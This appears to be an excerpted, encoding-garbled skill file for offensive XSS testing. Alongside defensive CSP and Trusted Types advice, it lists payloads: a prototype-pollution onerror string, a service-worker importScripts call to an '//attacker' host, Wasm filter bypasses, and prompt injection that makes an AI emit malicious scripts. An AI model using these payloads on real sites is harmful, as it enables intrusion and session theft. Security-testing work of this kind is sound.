---
name: offensive-xss
description: Use when testing web applications for stored, reflected, DOM, blind, polyglot, CSP, mutation, or event-handler XSS and related impact chains.
---
...
- **Prompt Injection â†’ XSS**: Manipulating AI to output malicious scripts
...
> [!NOTE]
> Â Chrome, Firefox and Safari may suppress `alert`, `confirm` and `prompt` dialogs when the page is opened in a crossâ€‘origin iframe or left in a background tab.Â For reliable detection prefer sideâ€‘effects such as `console.log`, network beacons (`fetch`/`XMLHttpRequest`), or DOM changes you can observe from DevTools.
...
```java
// setJavaScriptInterface XSS â†’ Native code execution
...
- **AcunetixÂ 15**: ships an LLMâ€‘powered mutation engine (2024).
- **Burp Suite â€œDAST+AIâ€ mode**: contextâ€‘aware scanner released in BurpÂ 2024.8.
- **XSSInspector AI/ML**: openâ€‘source reinforcementâ€‘learning fuzzer.
- **ParamSpiderÂ 3**: uses an LLM to infer hidden parameters across large estates.
...
- Note cookie behavior: `SameSite=Lax` is default in modern browsers; prefer nonâ€‘cookie state theft (tokens in storage, CSRFable actions) for impact
...
- âœ… Chrome/Edge 105+
- âœ… Firefox 117+ (behind flag)
- âš ï¸ Safari 17+ (experimental)
...
Modern Chromiumâ€‘based browsers support **Trusted Types**, a CSP extension that turns classic stringâ€‘based XSS sinks into typed ones. Enable it with
...
All assignments to `innerHTML`, `eval`, or similar APIs now require a `TrustedHTML` instance produced by a registered policy, making most DOMâ€‘XSS impossible by default. Angular 17+, React DOM 19 (experimental) and other frameworks enable Trusted Types automatically during builds.

Combine with secure cookies:

- `Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict`
- Prefer serverâ€‘side sessions; avoid putting tokens in `localStorage`

### Modern CSP PatternsÂ (2025)
...
- Hash/nonce + **`strict-dynamic`** removes host allowâ€‘lists while still blocking inline scripts
- `object-src 'none'` and `base-uri 'none'` close legacy vectors
- `require-trusted-types-for 'script'` activates TrustedÂ Types

### Fetchâ€‘MetadataÂ &Â CORP/COEP/COOP

Browsers add `Sec-Fetch-*` headers to every request.Â Servers can block crossâ€‘site, stateâ€‘changing requests:
...
### Serviceâ€‘Worker & Wasmâ€‘assisted XSS

- Inject a malicious `importScripts('//attacker/sw.js')` during a Serviceâ€‘Worker update to obtain persistent script execution.
- Inspect registrations via **DevTools â†’ Application â†’ Service Workers** or `chrome://serviceworker-internals`.
- Bypass keyword filters by encoding gadgets in WebAssembly and instantiating them with `WebAssembly.instantiate`.

### Prototypeâ€‘pollutionâ€‘toâ€‘XSS Chains

Libraries that merge JSON into the DOM may allow  
`%7B"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}%7D`  
to poison future writes and achieve DOMâ€‘XSS.Â Test wherever `Object.assign` or deepâ€‘merge utilities are used.

### Frameworkâ€‘specific Gotchas
...
### DetectionÂ &Â MonitoringÂ (AIâ€‘assisted)

| Tool                   | Notes                             |
| ---------------------- | --------------------------------- |
| **AcunetixÂ 15**        | LLMâ€‘powered mutation engine       |
| **Burp SuiteÂ 2024.8**  | â€œDAST+AIâ€ contextâ€‘aware scan mode |
| **XSSInspectorÂ AI/ML** | RLâ€‘based payload generator        |
| **ParamSpiderÂ 3**      | LLMâ€‘enhanced parameter discovery  |
